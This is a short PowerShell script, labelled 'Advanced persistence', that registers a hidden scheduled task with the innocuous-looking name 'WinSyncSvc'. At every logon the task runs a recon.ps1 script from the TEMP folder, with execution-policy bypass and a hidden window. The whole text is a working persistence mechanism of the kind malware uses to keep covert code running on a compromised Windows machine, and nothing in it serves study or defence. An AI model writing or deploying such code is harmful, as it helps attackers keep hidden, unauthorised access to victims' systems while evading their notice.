# Scheduled Task Seeder — Advanced persistence
$script = "$env:TEMP\\recon.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $script"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WinSyncSvc" -Action $action -Trigger $trigger -Settings $settings -Force
